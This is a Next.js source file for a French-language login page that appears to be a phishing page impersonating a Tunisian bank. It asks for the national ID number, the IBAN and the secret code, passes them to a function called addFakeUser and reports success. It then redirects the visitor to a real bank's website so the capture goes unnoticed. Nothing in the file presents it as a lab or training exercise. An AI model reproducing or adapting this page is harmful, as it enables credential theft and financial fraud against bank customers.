"use client";
import { useState } from "react";
import logo from "@/assets/bank-logo.jpg";
import { useRouter } from "next/navigation";
import { addFakeUser } from "@/lib/DATA_OPS";
export default function LoginPage() {
  const [cin, setCin] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [errors, setErrors] = useState({});
  const router = useRouter()
  const  validateForm = () => {
    const newErrors = {};

    if (!/^\d{8}$/.test(cin)) {
      newErrors.cin = "Le numéro CIN doit contenir exactement 8 chiffres.";
    }

    if (!/^TN\d{22}$/.test(accountNumber.replace(/\s+/g, ""))) {
      newErrors.accountNumber =
        "Le numéro de compte doit être un IBAN valide commençant par 'TN'.";
    }

    if (password.length < 6) {
      newErrors.password = "Le mot de passe doit contenir au moins 6 caractères.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async(e) => {
    e.preventDefault();

    if (!validateForm()) return;
    const result = await addFakeUser(cin,accountNumber,password)
    console.log(result)
    if(result.success){
      alert("Connexion réussie.");
      router.push("https://www.banquezitouna.com")
    }
  };

  return (
    <div className="login-container">
      <div className="login-card">
        <div className="logo-section">
          <img src={logo.src} alt="Bank Logo" className="bank-logo" />
          <h1 className="bank-title">Banque de Tunisie</h1>
          <p className="bank-subtitle">Espace Client – Connexion sécurisée</p>
        </div>

        <form onSubmit={handleSubmit} className="login-form">
          <div className="form-group">
            <label className="form-label">Numéro CIN</label>
            <input
              type="text"
              placeholder="Ex: 01234567"
              value={cin}
              onChange={(e) => setCin(e.target.value)}
              className="form-input"
            />
            {errors.cin && <p className="error">{errors.cin}</p>}
          </div>

          <div className="form-group">
            <label className="form-label">Numéro de compte / IBAN</label>
            <input
              type="text"
              placeholder="TN59 1234 5678 9012 3456 7890"
              value={accountNumber}
              onChange={(e) => setAccountNumber(e.target.value)}
              className="form-input"
            />
            {errors.accountNumber && (
              <p className="error">{errors.accountNumber}</p>
            )}
          </div>

          <div className="form-group">
            <label className="form-label">Code secret</label>
            <input
              type="password"
              placeholder="••••••••"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="form-input"
            />
            {errors.password && <p className="error">{errors.password}</p>}
          </div>

          <div className="remember-me">
            <input
              type="checkbox"
              checked={remember}
              onChange={(e) => setRemember(e.target.checked)}
              className="remember-checkbox"
            />
            <label className="remember-label">Se souvenir de moi</label>
          </div>

          <button type="submit" className="login-button">
            Se connecter
          </button>

          <div className="forgot-password">
            <p className="forgot-text">
              Mot de passe oublié ?{" "}
              <a href="#" className="forgot-link">
                Cliquez ici
              </a>
            </p>
          </div>
        </form>
      </div>
    </div>
  );
}
